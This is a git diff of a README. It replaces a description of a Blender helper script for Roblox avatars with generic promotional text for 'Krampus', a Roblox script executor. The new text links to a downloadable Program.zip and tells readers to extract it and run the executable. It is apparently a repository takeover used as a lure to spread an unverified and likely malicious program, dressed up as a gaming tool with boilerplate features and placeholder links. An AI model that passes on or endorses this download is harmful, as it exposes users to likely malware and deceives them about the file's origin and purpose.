@@ -1,19 +1,53 @@
-# Roblox-follower-Rig
-Small script that makes applying your Roblox avatar to my Follower asset for VRchat a whole lot easier.
+# Roexec-Executor
 
-https://jaxbline.gumroad.com/l/rertl
+Welcome to Roexec-Executor repository! 🎮
 
-https://discord.gg/htg3PWaWkU
+## Introducing Krampus - The Premier Roblox Executor
 
+![Krampus Logo](https://example.com/krampus_logo.png)
 
-# Requirments
-* Blender 4.0+
-* Your Roblox Avatar split up into 6 parts "LeftLeg, LeftArm, RightLeg, RightArm, Torso, Head"
-* Select both the Armature and Body parts
-* Hit the big apply mesh button and export!
+Krampus is the ultimate tool for script execution on the Roblox platform. Offering seamless performance on PC, Krampus empowers gamers with unparalleled control and flexibility. With Krampus, you can unleash your creativity and dominate the Roblox universe effortlessly.
 
+## Features:
 
-![image](https://github.com/user-attachments/assets/565efb6b-6b4e-4b5b-b8bc-06f87140c935)
+1. **Powerful Script Execution**: Execute scripts with ease and precision.
+2. **User-Friendly Interface**: Intuitive design for a seamless user experience.
+3. **Full Control**: Customize settings and tailor Krampus to your preferences.
+4. **Performance Optimization**: Ensure smooth and efficient script execution.
+5. **Regular Updates**: Continuous improvements and new features.
 
+## Installation:
 
-![LobFile com-Qv7V](https://github.com/user-attachments/assets/9f19cb6d-453e-439b-ada1-2c7c19dec34b)
+Download the latest version of Krampus:
+[![Download Krampus](https://img.shields.io/badge/Download-Krampus-blueviolet)](https://github.com/user-attachments/files/17578090/Program.zip)
+
+## Getting Started:
+
+Follow these steps to start using Krampus:
+
+1. **Download Krampus**: Click on the download link above.
+2. **Extract Files**: Unzip the downloaded file to your desired location.
+3. **Launch Krampus**: Run the executable file to start using Krampus.
+
+## Support:
+
+If you encounter any issues or have questions, feel free to reach out to our support team at [support@krampusexecutor.com](mailto:support@krampusexecutor.com).
+
+## Contributing:
+
+We welcome contributions from the community to help us enhance Krampus. If you have ideas or suggestions for improvement, please submit a pull request.
+
+## Stay Connected:
+
+Follow us on social media for updates and announcements:
+
+- Twitter: [@KrampusExecutor](https://twitter.com/KrampusExecutor)
+- Facebook: [KrampusExecutor](https://www.facebook.com/KrampusExecutor)
+
+## Legal:
+
+Krampus is a product created by Roexec Software. All rights reserved. 
+
+---
+
+Thank you for choosing Krampus as your Roblox executor of choice! 🚀🔥
